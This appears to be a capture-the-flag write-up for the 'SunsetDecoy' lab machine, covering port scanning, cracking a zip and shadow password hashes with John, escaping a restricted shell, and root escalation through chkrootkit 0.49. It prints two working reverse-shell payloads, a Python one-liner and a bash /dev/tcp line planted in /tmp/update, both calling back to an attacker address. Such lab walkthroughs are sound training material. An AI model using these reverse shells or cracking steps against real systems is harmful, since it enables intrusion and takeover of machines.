# SunsetDecoy

## Nmap

```
sudo nmap 192.168.184.85 -p- -sS -sV                                                                                                                                                                                             130 ⨯

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

First up checking the root page for port 80 takes us to an index page containing a file called save.zip.

![](<../../../.gitbook/assets/image (1233).png>)

Upon downloading the file we are asked for a password to open. Kali comes pre-installed with a `John` module called `zip2john`. We can use this to create a hash of the file which can be used for cracking with `John`.

```
/usr/sbin/zip2john /home/kali/Downloads/save.zip > /home/kali/Desktop/hash
```

![](<../../../.gitbook/assets/image (1234).png>)

We can then run `John` against the hash.

```
sudo john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt /home/kali/Desktop/hash
```

![](<../../../.gitbook/assets/image (1235).png>)

We soon get the password `manuel`. We can then extract the contents of save.zip. After doing so we extract the /etc/ folder.

![](<../../../.gitbook/assets/image (1236).png>)

Out of these files shadow is of interest the most.

![](<../../../.gitbook/assets/image (1237).png>)

We have passwords hash for the root account and the account '296640a3b825115a47b68fc44501c828'. I was unable to crack the root password with a wordlist so instead was able to crack the other account as per below:

```
sudo john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt /home/kali/Desktop/hash
```

![](<../../../.gitbook/assets/image (1238).png>)

We now have the password: `server` I was then able to login to `SSH` with the username and password.

![](<../../../.gitbook/assets/image (1239).png>)

When attempting to run a simple command such as cat we are given the error message: `-rbash: cat: command not found`.

To help bypass this we can exit out of SSH and reconnect with the following command:

```
ssh 296640a3b825115a47b68fc44501c828@192.168.184.85 -t "bash --noprofile"
```

Once in we have a more usable shell. We can then run a Python reverse shell to create another shell connection this should get us more usable.

```
/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.184",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

Once in the new shell export a new path so we have use of commands easily.

```
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

![](<../../../.gitbook/assets/image (1240).png>)

After enumerating the machine for a while I was unable to find points of escalation. I then transferred over [pspy64](https://github.com/DominicBreuker/pspy/releases) and let it run.

```
chmod +x pspy64
./pspy64
```

Soon after running we get a huge amount of entries for chkrootkit-0.49.

![](<../../../.gitbook/assets/image (1241) (1).png>)

Researching on Google shows a local privilege escalation exploit with this version and below:

{% embed url="https://www.exploit-db.com/exploits/33899" %}

Essentially this will execute a binary in /tmp/update. We can create update as a reverse shell and when executed should give us a root shell.

```
echo '#!/bin/bash
bash -i >& /dev/tcp/192.168.49.184/80 0>&1' > /tmp/update
```

Make it executable:

```
chmod +x /tmp/update
```

Then open a `netcat` listener to the specified port and we should land a root shell.

![](<../../../.gitbook/assets/image (1242) (1).png>)
